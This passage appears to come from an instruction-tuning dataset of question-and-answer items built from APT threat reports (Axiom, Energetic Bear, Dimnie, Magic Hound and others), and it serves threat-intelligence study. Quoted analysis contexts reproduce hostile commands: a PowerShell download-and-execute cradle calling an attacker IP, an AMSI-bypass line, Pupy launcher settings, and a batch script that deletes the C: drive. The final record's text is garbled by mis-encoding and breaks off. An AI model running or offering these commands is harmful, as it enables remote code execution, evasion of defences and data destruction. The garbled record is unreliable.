    "output": "Trident Ursa's evolving TTPs demonstrate its adaptability and resilience in the face of ongoing cyber defenses. By continually shifting their methods, the group aims to stay ahead of detection mechanisms and maintain persistent access to their targets. This adaptability includes attempts to compromise critical infrastructure, such as the unsuccessful attack on a large petroleum refining company within a NATO member nation, and leveraging various phishing and malware techniques. For cybersecurity professionals, this underscores the importance of continuous monitoring and updating defense strategies. They must employ advanced tools like Advanced URL Filtering and DNS Security to detect and mitigate emerging threats. Additionally, staying informed about the latest TTPs through open-source intelligence and threat intelligence sharing is crucial for proactive defense.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Remediation\nCurrently, organizations that wish to protect themselves from the malware that Axiom has been observed using should download and utilize the latest MSRT release. This tool has been verified to provide protection against malware families that Axiom favors, and is freely available to all Microsoft installations. It is suggested that enterprise organizations push out and execute MSRT on a monthly basis. Additionally, all members of the Operation SMN group have up-to-date signatures and heuristics for detecting the Axiom malware families, as well as any vendors involved in Microsoft's VIA program.\nIt is strongly advised that organizations seeking protection from Axiom avoid the temptation of solely deploying network based signatures. Because Axiom continually creates new C2 infrastructure for each new target and can quickly transition to new malware tooling, it is very unlikely that existing network IOCs will offer any meaningful level of protection for organizations whose infections are new or previously undiscovered.\nNetwork operators can and should learn from the Axiom group's tradecraft; security teams and IT staff should be especially wary of any traffic going to destination servers that does not match the apparent intent of these servers. For example, large data transfers moving towards DNS nameservers on port 53 with no observable DNS content that are associated with known or related partners should be viewed as suspect. Hikit's usage of internally routed proxy nodes can complicate this task, and only advanced network analytics that includes a holistic view of internal and external network traffic can provide anything near 100% certainty. Network boundaries of all types should be monitored. If an internal network can route from restricted zones to ones of lower restriction, it should be monitored for data exfiltration in the same manner as a traditional border network. Above all there is absolutely no substitute for continued vigilance -- by the time Hikit is installed on a victim's infrastructure, the operation is in its final stages, and the attackers generally have free reign over the victim network.\nEnterprises are advised that while Axiom represents an advanced attacker, their power comes from their discipline and logistics. Ultimately, the removal of common \"low hanging fruit\" in network and endpoint security will go far to prevent Axiom from easily accessing networks. Additional suggestions for protection against Axiom's attacks would be:\n\u25cf Block or sinkhole the DNSPOD name servers. DNSPOD seems to be the preferred provider for DNS services for Axiom, and many organizations can block these resources without adverse effect on business needs.\n\u25cf Install and execute Microsoft's EMET on endpoint machines, and configure it to your environment.\n\u25cf Globally edit Windows policies to disable the \"Sticky Keys\" functionality.\n\u25cf Restrict all remote access (RDP, SSH, Citrix, VPN, etc.) and ensure that this access is only given to people that need it versus by default for the whole company; wherever possible, implement two-factor authentication for any remote access.\n\u25cf Keep strong monitoring on VPN endpoints -- Axiom has demonstrated the ability to enter networks after compromising VPN client user credentials.\n\u25cf Two-factor protection to webmail services should be added where possible.\n\u25cf Ensure that local administrative accounts are not universal across your network, as a single compromise can bring the security of the entire network into question. Ensure that local firewalls are configured and restrict access to both servers and workstations to only those subnets and users that require it.\n\u25cf Implement application whitelisting to prevent execution of unauthorized executables -- Microsoft AppLocker, Bit9, and other third party solutions are all improvements over default installations without whitelisting.\n\u25cf Encrypt e-mail where possible, even between internal users.\n\u25cf Ensure antivirus software is reporting to a central, monitored location. Axiom's binaries can flag AntiVirus rules that end up ignored, a security failing that they rely on.\n\u25cf Ensure proper auditing and review of security firewall rules, antivirus updates, IDS signatures, and other security controls. Axiom actors during active compromises have been observed to disable key signatures or rules to force victim organizations to lose visibility.\n\u25cf Apply security patches in a timely manner. While Axiom does make use of 0-day vulnerabilities, the group has also used disclosed, patched vulnerabilities that are found on outdated systems in a target's network.\n\u25cf Reference information provided by the FBI in their FLASH report - additional remediation information and suggestions are included36.\n36 http://www.slideshare.net/ragebeast/infragard-hikitflash\nBig Headline: Kudos\nOperation SMN and the subsequent actions taken by the group members could not have occurred without the generosity and talent of several organizations. While the publicly acknowledged members of the group made critical contributions there are other firms that were critical to the findings contained in this report. Their datasets, services, and software allowed coalition members to construct a substantially stronger case than would have been otherwise possible. Farsight Security generously provided Novetta with unrestricted access to their historical passive DNS dataset, allowing analysts to investigate the C2 infrastructure used by Axiom over a wide window of time. Endgame provided Novetta with extensive proprietary threat data and analytical processing capabilities allowing Novetta to gain a deeper insight into compromised network footprints. Novetta would also like to thank those organizations and individuals who quietly contributed to the content covered in this report.\nSmall Headline: Interesting Facts:\n\u25cf Relies on a NDIS (network) driver to communicate between the network and the malware\n\u25cf The infected machine acts as the server while the controlling machine is the client , therefore at least one Hikit infection must be on an internet facing machine\n\u25cf Contains no configuration information at all\n\u25cf The NDIS (network) driver is a mixture of several open source pieces of code, most notably the passthru NDIS driver example from a 2003 blog37 .\n\u25cf The client authenticates to the server at the NDIS driver layer by providing a specific set of strings that mimic HTTP requests\n\u25cf Authors routinely forgot to remove the PDB strings revealing at least two compile machines\n\u25cf Earliest known variants from early 2011\n37 http://www.wd-3.com/archive/extendingpassthru2.htm\nSmall Headline: Interesting Facts:\n\u25cf Comes in 64-bit and 32-bit versions depending on the target's infrastructure\n\u25cf 32-bit versions use a rootkit driver to hit the malware process, network endpoints, registry keys and files.\n\u25cf The rootkit is based heavily on the Agony rootkit which is open source\n\u25cf Unlike Gen1, the malware acts as a client to the C2's server.\n\u25cf Uses the same XOR encryption scheme as Gen 1\n\u25cf Developmental overlap found between Gen 1 and Gen 2 (new Gen1 sample found during the Gen 2 time span)\n\u25cf Has at least 5 known sub-generations with the Gen 2 lineage\n\u25cf Spanning from late 2011 to 2013\nSmall Headline: Interesting Facts:\n\u25cf Evidence suggests that Zox has variants dating back to at least 2008, and may have multiple generations, and may have evolved from a simple spreader into something a bit more RAT like.\n\u25cf Uses PNG file format as the carrier format for data to and from the C2\n\u25cf The sample from 2008 uses SMB to communicate indicating it was originally a local exploitation tool instead of a remote tool\n\u25cf Does not contain any C2 information as the attacker must provide the information at runtime via the command line\n\u25cf Evidence in Zox family of tools suggests a focus on China, Taiwan, US/UK, Korean language sets for exploits offsets leveraged in spreading functionality.\n\u25cf Was observed being leveraged by attackers via base64 encoded cab file that was then installed via a login script for a specific user. Very few samples have been found compared to all the other malware families the effort is tackling.\nSmall Headline: Capability Features:\n\u25cf File management: upload, download, create directory, list files, enumerate entire folder trees, move files, delete files, rename files, get file attributes, mimic timestamps of other files (e.g. copying the timestamp of kernel32.dll to another file to allow for blending in)\n\u25cf Derusbi may have a windows GUI component for the operator (based on file system behavior, and patterns of use).\n\u25cf Remote shell\n\u25cf Basic (limited) network proxying\nSmall Headline: Interesting Facts:\n\u25cf Uses a 64-byte handshake of seemingly random data with four bytes specifically configured to act as the handshake\n\u25cf The infected machine acts as the server while the controlling machine (the attacker's machine) is a client (the reverse of typical malware communication)\n\u25cf Does not contain any configuration information related to the attacker's IP, only contains the campaign code\n\u25cf Appears to be able to co-exist with other running services on the same port [unconfirmed, but speculated based on network capture evidence]\nBig Headline: Appendix E: Malware Hashes\nTo the best of our abilities, Novetta has filtered some of the sample hashes collected from the below sample hashes. This has been due to the highly targeted nature of some of the malware samples Operation SMN has collected. The defensive value of knowing those samples or the hashes for organizations other than the targeted is nil given the technical information produced and shared by this effort. The below hashes are for sample families that leverage shared generic infrastructure between multiple compromised infrastructure or contain no configuration information in the binary.\n\nWhat specific network behaviors should security teams look out for to detect potential Axiom activity, and why are these behaviors significant?",
    "output": "Security teams should be wary of any traffic going to destination servers that does not match the apparent intent of these servers. For example, large data transfers moving towards DNS nameservers on port 53 with no observable DNS content that are associated with known or related partners should be viewed as suspect. Hikit's usage of internally routed proxy nodes can complicate this task, and only advanced network analytics that includes a holistic view of internal and external network traffic can provide anything near 100% certainty. Monitoring network boundaries of all types is essential, as internal networks that can route from restricted zones to ones of lower restriction should be monitored for data exfiltration in the same manner as a traditional border network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 1. Executive Summary\nEnergetic Bear/Crouching Yeti is an actor involved in several advanced persistent threat (APT) campaigns that have been active going back to at least the end of 2010. Targeted sectors include:\n\u2022 Industrial/machinery\n\u2022 Manufacturing\n\u2022 Pharmaceutical\n\u2022 Construction\n\u2022 Education\n\u2022 Information technology\nMost of the victims we identified fall into the industrial / machinery building sector, indicating this is of special interest.\nTo infect the victims, the attackers rely on three methods:\n\u2022 Spearphishing using PDF documents embedded with a flash exploit (CVE-2011-0611)\n\u2022 Trojanized software installers\n\u2022 Waterhole attacks using a variety of re-used exploits\nDuring the attacks, the Crouching Yeti uses several malware / Trojans, which exclusively infect Windows systems:\n\u2022 Havex Trojan\n\u2022 Sysmain Trojan\n\u2022 The ClientX backdoor\n\u2022 Karagany backdoor and related stealers\n\u2022 Lateral movement and second stage tools\nFor command and control, these connect to a large network of hacked websites. These sites host malware modules, victim information and issue commands to infected systems.\nThe dozens of known Yeti exploit sites and their referrer sites were legitimate, compromised sites. They ran vulnerable content management systems or vulnerable web applications. None of the exploits used to compromise the servers were known to be zero-day. None of the client side exploits re-used from the open source metasploit framework were zero-day.\nOverall, we observed about 2,800 victims worldwide, the most prevalent attack tool being the Havex Trojan.\nWe believe this group is highly determined and focused on a very specific industrial sector of vital interest. It uses a variety of ways to infect its victims and exfiltrate strategic information. The analyzed data seems to suggest the following points:\n\u25cf It is not currently possible to determine the Country of origin The attackers\u2022 global focus is much broader than power producers\n\u25cf Their toolset has remained stable over time\n\u25cf Managed, minimal, methodical approach to sustained operation\n\u25cf Appropriate use of encryption (symmetric key protected with attackers public key for encrypted log file exfiltration)\nThis report provides technical details on how they perform their operations.\n\nWhy did the Energetic Bear/Crouching Yeti APT group primarily target the industrial/machinery sector? What does this indicate about their objectives and strategies?",
    "output": "The Energetic Bear/Crouching Yeti APT group primarily targeted the industrial/machinery sector because it is of special interest to them. This indicates that their objectives are likely tied to gaining strategic information or control within this critical sector. Their focus suggests a high level of determination and a methodical approach to sustained operation, aiming to exfiltrate valuable data that could provide significant advantages.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are some of the key references cited in the MONSOON report that highlight the historical context and technical details of related cyber threats and tools?",
    "output": "The MONSOON report cites several key references that provide historical context and technical details of related cyber threats and tools. These include 'The Hangover Report' by Bluecoat, which discusses Operation Hangover, and a report by Norman AS titled 'Operation Hangover: Unveiling an Indian Cyberattack Infrastructure.' Additionally, the report references AutoIt, a scripting language used in some of the malware components, and various other sources such as Cymmetria's report on the Patchwork targeted attack, Microsoft Office memory errors, and GitHub repositories containing malware source codes and UAC bypass methods. These references collectively provide a comprehensive background on the tactics, techniques, and procedures used by the adversaries involved in the MONSOON campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThe following is a short report with the intention to inform the public about Indicators of Compromise (IOCs) and Modus Operandi of the attacker group that is responsible for the RUAG cyber espionage case, which has been made public on Wednesday, May 4th 2016.\nOne of the main tasks of MELANI is to support critical infrastructures during security incidents and the coordination of relevant actors involved. Regarding technical first response and support, GovCERT supported RUAG with log analysis, forensics, malware reverse engineering and security monitoring. The report below reflects our experiences during this case.\n\nHow did GovCERT assist RUAG in responding to the cyber espionage case, and what specific technical activities were undertaken to support the investigation?",
    "output": "A: GovCERT assisted RUAG by providing technical first response and support, which included several key activities. These activities encompassed log analysis to identify suspicious patterns and behaviors, forensics to gather evidence and reconstruct the timeline of events, malware reverse engineering to understand the capabilities and origins of the malicious software used, and security monitoring to detect ongoing or new threats. These efforts were crucial in helping RUAG manage the incident effectively and mitigate further risks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Hidden Requests\nLet us dive right in and have a look at a typical HTTP request from Dimnie to its command and control infrastructure.\nDoes this malware use a (now-defunct) Google service to aid its initial phone home? Not quite. Examining the HTTP request, this appears to be an HTTP Proxy request, as described by (<https://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html>)RFC2616:\nThe absoluteURI form is REQUIRED when the request is being made to a proxy. The proxy is requested to forward the request or service it from a valid cache, and return the response. Note that the proxy MAY forward the request on to another proxy or directly to the serverspecified by the absoluteURI. In order to avoid request loops, a proxy MUST be able to recognize all of its server names, including any aliases, local variations, and the numeric IP address. An example Request-Line would be:GET http://www.w3.org/pub/WWW/TheProject.html HTTP/1.1To allow for transition to absoluteURIs in all requests in future versions of HTTP, all HTTP/1.1 servers MUST accept the absoluteURI form in requests, even though HTTP/1.1 clients will only generate them in requests to proxies.\nDimnie uses this feature to create a supposedly legit HTTP proxy request to a Google service. However, the Google PageRank service (toolbarqueries.google.com) has been slowly phased out since 2013 and as of 2016 is no longer open to the public. Therefore, the absolute URI in the HTTP request is for a non-existent service and the server is not acting as a proxy. This seemingly RFC compliant request is merely camouflage.\nWe know what it isn't, so we will dive deeper to figure out what is happening underneath the camouflage layer. Start by having a look at the DNS request that immediately preceded this HTTP GET request.\nIt looks pretty normal, but we can see an authoritative nameserver returning an IP address, 176.9.81[.]4, which is highlighted in the image below.\nWhile it may not seem so at first glance, this DNS query is related to the initial GET request to Google. Below is the raw hex of the IP header of the HTTP request above:\nThe answer (176.9.81[.]4) from the initial DNS request for onechat[.]pw is used as the destination IP for the follow up HTTP request that appears to connect to toolbarqueries.google.com. Sending the request to an entirely different server is not complicated to achieve, but how many analysts would simply see a DNS request with no [apparent] related subsequent traffic? That is precisely what Dimnie is relying upon to evade detections.\nSmall Headline: 1 fYQAcgUGKQ04yy+39O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm\nDecoding the \"ch\" parameter yields us a AES key which Dimnie uses to decrypt payloads. The attacker uses AES 256 in ECB mode to encrypt payloads which are push to a compromised host and decrypted.\nThe code below illustrates, in Python, the method we used to derive this key.\n1 >>> import binascii\n2 >>> import base64\n3 >>> from Crypto.Cipher import AES\n4 >>> a = \"fYQAcgUGKQ04yy+39O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm\"\n5 >>> b = base64.b64decode(a)\n6 >>> decryptor = AES.new('\\0' *32, AES.MODE_ECB)\n7 >>> c = decryptor.decrypt(b)\n8 >>> binascii.hexlify(c)\n9 'cda59f1670cf48bf0000000011217350b14b3f2d4c6001006fb3b0fb00000000adf1de43000000000000000000000000'\n10 >>> key = c[4:8] + ('\\0' * 28)\n11 >>> binascii.hexlify(key)\n12 '70cf48bf00000000000000000000000000000000000000000000000000000000'\nBesides the HTTP payload, which is an AES 256 ECB encrypted PE file (after decrypting, SHA256: 6173d2f1d7bdea5f6fe199d39bbefa575230c5a6c52b08925ff4693106518adf), the server reply contains only one other HTTP header that seems to be used by the malware; the Cookie value sent back from the C2 server. This Cookie is a 48 byte, base64 encoded, AES 256 ECB encrypted series of UINT32 values pertaining to the payload (when requested) or outbound data (HTTP POSTs, see next section) as can be seen below (comments appended after //.)\n1 struct DimnieInformation\nHere is a list of possible types which may be found at offset 0x24:\nValue\nDescription\nThe values contain a preset, defined size for the payload as well as an expected CRC32 value. Effectively, the Cookie parameter is used to verify the payload's integrity during the module downloader portion of the malware's lifecycle. When the Cookie value is included in later C2 traffic, it is primarily used to identify the type of data being sent back to the server and the reporting module.\nBig Headline: More Camouflage\nData exfiltration by the associated modules is performed using HTTP POST requests to another Google domain, gmail[.]com. However, just like the module downloader portion of the malware, these HTTP requests are hardcoded to be sent to an attacker controlled server. Again, Dimnie attempts to blend in by looking at least somewhat legitimate, although the data exfiltration traffic is far less convincing than that of the module downloads.\nOnce again, the data is appended to an image header and encrypted using AES 256 in ECB mode. The Cookie value follows the same structure provided in the previous section. This initial push contains system information as can be seen in the decrypted output below (data enclosed in brackets has been edited):\n1 [netbios name]\n2 WORKGROUP\n3 2\n4 HomeGroupUser$\n5 [Hostname]\n6 [Language]\n7 1\n8 10.0.2.15 (08-00-27-D9-83-51) 'Intel(R) PRO/1000 MT-Desktopadapter'\n9 PCI\\VEN_8086&DEV_100E&SUBSYS_001E8086&REV_02\\3&267A616A&0&18\n10 4\n11 Administrator (0x10203)\n12 [Username] (0x10223)\n13 HomeGroupUser$ (0x10201)\n[Hostname] (0x10221)\nDuring our analysis, we identified follow on POST requests containing screenshots of the compromised desktop and process activity lists which were encrypted and appended to a false JPEG header as described previously.\nBig Headline: Decoding the Traffic\nNow that we understand how Dimnie retrieves its modules and how it protects them, we can use the derived AES key to decode the observed payloads from our PCAP data. The payloads themselves are never written to disk as they are downloaded and subsequently injected directly into memory. The module ID is stored at offset 0x2C as a 32 byte value in the Cookie field, however to calculate the \"true\" module ID we must use the following formula using the key found at offset 0x04 in the cookie: uModuleID = uID \u2013 uKey. Below is a table of observed module IDs, their functions, and type of information as referenced by the Cookie Header (at offset 0x24):\nThe self-destruct module, 0x20009, drops and executes the following batch script:\n1 @echo off\n2 Title System need to reboot computer!\n3 color 0c\n4 Echo Auto Starting in 5 seconds\n5 @ping 127.0.0.1 -n 5 -w 1000 > nul\n6 @ping 127.0.0.1 -n %1% -w 1000 > nul\n7 cls\n8 Color 0e\n9 Echo delete disk C\n10 del C:\\\\ /s /q\n11 @ping 127.0.0.1 -n 3 -w 1000 > nul\n12 @ping 127.0.0.1 -n %1% -w 1000 > nul\n13 cls\n14 color 0c\n15 Echo Remove directory\n16 Rd C:\\\\ /s /q\n17 @ping 127.0.0.1 -n 3 -w 1000 > nul\n18 @ping 127.0.0.1 -n %1% -w 1000 > nul\n19 cls\n20 Msg * \\SYSTEM ERROR!HARDDRIVE IS OUT OF ORDER!\\;\nThe primary purpose of the modules we've observed observed is information stealing and reconnaissance. It should be noted that Dimnie's modular framework allows for a variety of capabilities to be accessed by its operators, thus the modules observed during the analyzed campaign may not encompass all available functionality.\nBig Headline: Conclusion\nThe global reach of the January 2017 campaign which we analyzed in this post is a marked departure from previous Dimnie targeting tactics. Multiple factors have contributed to Dimnie's relatively long-lived existence. By masking upload and download network traffic as innocuous user activity, Dimnie has taken advantage of defenders' assumptions about what normal traffic looks like. This blending in tactic, combined with a prior penchant for targeting systems used by Russian speakers, likely allowed Dimnie to remain relatively unknown.\nCustomers are protected by IPS, Dimnie is detected as malware by Wildfire, and Autofocus customers can see related samples using the Dimnie tag.\nWe are also including IOCs for this malware family dating back to 2014 which include domains from DNS lookups (Appendix A) and dropper hashes (Appendix B). IOCs specifically mentioned in this post are included in the next section.\n\nHow does Dimnie ensure the integrity of its payloads during the module downloader phase, and what role does the Cookie parameter play in this process?",
    "output": "Dimnie ensures the integrity of its payloads by using a Cookie parameter in the HTTP response from the command and control server. This Cookie is a 48-byte, base64 encoded, AES 256 ECB encrypted series of UINT32 values. It contains a preset, defined size for the payload as well as an expected CRC32 value. The Cookie parameter is used to verify the payload's integrity during the module downloader portion of the malware's lifecycle. Additionally, the Cookie value identifies the type of data being sent back to the server and the reporting module in later C2 traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT3's use of CVE-2014-4113 in Operation Double Tap demonstrate a Privilege Escalation technique?",
    "output": "Privilege Escalation is a technique used by adversaries to gain higher-level permissions on a system or network. In the case of APT3's Operation Double Tap, the use of CVE-2014-4113, a privilege escalation vulnerability, demonstrates a clear attempt to gain elevated access. By exploiting this vulnerability, APT3 can potentially gain SYSTEM/root level or local administrator access, allowing them to perform actions that would otherwise be restricted. This is a classic example of Privilege Escalation, where an adversary takes advantage of a system weakness to gain the necessary permissions to achieve their objectives. Furthermore, the fact that APT3 is using a known vulnerability in tandem with another exploit (CVE-2014-6332) suggests a shift in strategy and operational tempo for this group, highlighting the importance of Privilege Escalation in their tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: MAGICHOUND.LEASH\nThe Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash. We discovered this connection when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications.\nLeash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server. All of its available commands (see Appendix), except for the VER command seen in Figure 5, must be issued by individuals in the IRC channel with nicknames that start with \"AS_\" or \"AF_\".\nThere are a great deal of similarities between the IRC bot originally discussed in iSight's NEWSCASTER whitepaper and LEASH. iSight's whitepaper provided details on an IRC bot, which some refer to as Parastoo based on the password used to join the IRC channel, as seen in the following network traffic generated when attempting to connect to the C2:\nPerforming a binary diff revealed a 67% similarity between the Leash and Parastoo samples. In addition to sharing significant portions of code, both of the IRC bots require an IRC user's nickname to start with either \"AF_\" or \"AS_\" to run commands on the system. Also, the two bots have similar responses to \"VER\" commands seen in Figure 6 below, which differ slightly from the responses seen generated by Leash.\nMedium Headline: MPKBot\nWe also found a second IRC bot called MPK using the same IP for its C2 server that a Leash sample was hosted on. This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as detailed in a whitepaper by CheckPoint regarding a threat group called (<http://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf>)Rocket Kitten. We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one referenced in the white paper have considerable similarities from a behavior standpoint as well as direct code overlap.\nBig Headline: CONCLUSION\nThe Magic Hound attack campaign is an active and persistent espionage motivated adversary operating in the Middle East region. Organizations in the government, energy, and technology sectors have been targeted by this adversary, specifically organizations based in or doing business in Saudi Arabia. The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public. None of the tools we uncovered were found to be exploit-driven, and relied exclusively on social engineering tactics to compromise targets. While we did discover a potential relationship with the Rocket Kitten adversary group, we cannot confirm the extent of that relationship at this time, although we will continue to monitor the activities of Magic Hound.\nPalo Alto Networks customers are protected via the following:\nWildFire identification and detection of malicious samples\nCommand and control servers are classified as malicious\nAutoFocus tags have been created\nSmall Headline: MAGICHOUND.ROLLOVER\nThe Magic Hound campaign used Word and Excel documents as a delivery method, specifically documents that contain a malicious macro that attempts to load either the Pupy RAT or possibly Meterpreter. We call this tool MagicHound.Rollover. In one example, the Word document contained a button with the label \"First click \"Enable Content\" above the page, then click here to fill out the form\"\nThis string attempts to trick the user into enabling macros to execute the malicious code within the macro. When the macro executes, it unhides a table that contains the contents of a legitimate document in an attempt to make the user less suspicious of the malicious activities occurring in the background. The macro contains malicious code that attempts to download content from a remote server.\nThe macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques. The first technique is rather straightforward, using PowerShell's \"iex\" function to execute a string obtained from a remote server. The macro carries out this first technique by running the following command:\n1 powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46.154:3485/eiloShaegae1')\"\nThe code above generates the following HTTP request, which the C2 server would then respond to with a script that PowerShell would execute:\nGET /eiloShaegae1 HTTP/1.1\nHost: 139.59.46[.]154:3485\nConnection: Keep-Alive\nThe second method involves using PowerShell to create a thread to execute a buffer of shellcode, which we believe the threat actors obtained from the (<https://github.com/trustedsec/unicorn>)Magic Unicorn source code. The Unicorn source code contains a comment for this specific PowerShell command, which is described as a \"one line shellcode injection with native x86 shellcode\".\nThe shellcode begins with a stub that is responsible for decrypting additional shellcode. To decrypt the additional shellcode, the stub code will start with an initial key, such as 0x6CAF9362 and XOR the first DWORD of the additional shellcode. It will then add the resulting DWORD to the key that the stub code will use to decrypt the second DWORD and so on. After we decrypted the additional shellcode, we determined that the functional shellcode is part of the Metasploit Framework, specifically using the block_api.asm code to resolve API function names and the block_reverse_http.asm code to obtain additional shellcode to execute on the system. The assembly code used to create the shellcode can be obtained from:\nThe purpose of the shellcode is to obtain additional shellcode to execute using an HTTP request to the URL \"hxxp://45.76.128[.]165:4443/0w0O6\". We are unsure of the shellcode hosted at this URL, but it is possible that additional shellcode-based payloads like Meterpreter could have been served by this shellcode.\nTwo Rollover delivery documents (SHA256: 6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b and SHA256: 218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2) attempted to communicate with the URL hxxp://139.59.46[.]154:3485/eiloShaegae1 to obtain additional code to execute. On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:\n1 powershell.exe -exec bypass -window hidden -noni -nop -encoded\nJABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQB\nAs you can see, the C2 server responds with a PowerShell command that will run on the system. The PowerShell command decodes to the following:\n1 $command =\n2 'WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGk 3 if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 4 { 5\n6 $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded ' + $command 7 IEX $exec 8 }\nThe script above checks the system architecture to determine if it is an x64 machine and attempts to execute a base64 encoded command that decodes to the following:\n1 [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; 2 try{\n3 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)\n4 }catch{}\n5 IEX (New-Object Net.WebClient).DownloadString('http:// 139.59.46[.]154:3485 /IMo8oosieVai');\nThis decoded PowerShell script attempts to download and execute a file using HTTP from the URL \"hxxp:// 139.59.46[.]154:3485 /IMo8oosieVai\". The C2 server will respond to this HTTP GET request with a large amount of data that includes a PowerShell script that also contains a DLL payload that is embedded as a series of base64 encoded chunks, that is then decoded using the following code:\n1 $PEBytesTotal = [System.Convert]::FromBase64String($PEBytes0+$PEBytes1+$PEBytes2+$PEBytes3+$PEBytes4+$PEBytes5+$PEBytes6+$PEBytes7+$PEBytes8+$PEBytes9+$PEBytes10+$PEB\nThe PowerShell script loads the DLL payload directly into memory without saving it to the disk. The Pupy payload was generated using the following configuration, which shows the C2 IP/port and the use of the \"obfs3\" transport:\n1 LAUNCHER_ARGS=['--host', '139.59.46[.]154:3543', '-t', 'obfs3']\nIt appears the adversary used a majority of the following Pupy module to create the PowerShell commands used in the delivery documents:\n\nQuestion: How does the MagicHound.Leash IRC bot authenticate commands, and what are the similarities between Leash and the Parastoo IRC bot discussed in iSight's NEWSCASTER whitepaper?\n\nAnswer:",
    "output": "The MagicHound.Leash IRC bot authenticates commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server. Commands must be issued by individuals in the IRC channel with nicknames starting with 'AS_' or 'AF_'. There are several similarities between Leash and the Parastoo IRC bot. A binary diff revealed a 67% similarity between the two samples. Both bots require an IRC user's nickname to start with either 'AF_' or 'AS_' to run commands on the system. Additionally, both bots have similar responses to 'VER' commands, although they differ slightly in their responses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Initial C2 Phone Home Beacon\n7KH\ue003&\ue015\ue003ORFDWLRQ\ue003LQ\ue003WKLV\ue003VDPSOH\ue003LV\ue003VWDWLFDOO\\\ue003GH\u00bfQHG\ue003DV\ue003\ue014\ue011\ue01c\ue011\ue018\ue011\ue016\ue01b\ue01d\ue017\ue017\ue016\ue003\ue00b0DOD\\VLD\ue01d\ue0037PQHW\ue00f\ue0037HOHNRP\ue0030DOD\\VLD\ue003 %KG\ue00c\ue011\ue003:KLOH\ue003WKHUH\ue003LV\ue003\u00b5GHDG\ue003FRGH\u00b6\ue003WKDW\ue003ZLOO\ue003GRZQORDG\ue003WKH\ue003&\ue015\ue003ORFDWLRQ\ue003IURP\ue003DQ\ue003+773\ue00385/\ue003WKDW\ue003FRXOG\ue003EH\ue003GH\u00bfQHG\ue003 in the binary, using the User-Agent string \"Google\", this code is not activated due to the format of the statLFDOO\\\ue003GH\u00bfQHG\ue003&\ue015\ue003ORFDWLRQ\ue003XVLQJ\ue003DQ\ue003,3\ue003DGGUHVV\ue011\ue0037KXV\ue003WKH\ue003VDPSOH\ue003ZLOO\ue003RQO\\\ue003DWWHPSW\ue003WR\ue003FRQQHFW\ue003GLUHFWO\\\ue003XVLQJ\ue003 a raw socket to the C2 located at 1.9.5.38:443. This indicates the use of a 'boiler plate code' or a builder software package that automates the creation of the malicious sample.\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n\"\ue003\ue0037KH\ue003FRPSXWHU\ue003QDPH\ue003DV\ue003REWDLQHG\ue003ZLWK\ue003WKH\ue003*HW&RPSXWHU1DPH\ue00b\ue00c\ue003$3,\n\"\ue003\ue0037KH\ue003XVHUQDPH\ue003RI\ue003WKH\ue003FXUUHQW\ue0035HPRWH\ue003'HVNWRS\ue003VHVVLRQ\ue003LI\ue003FXUUHQWO\\\ue003EHLQJ\ue003H[HFXWHG\ue003LQ\ue003D\ue0035HPRWH\ue003    Desktop session or \"none\" 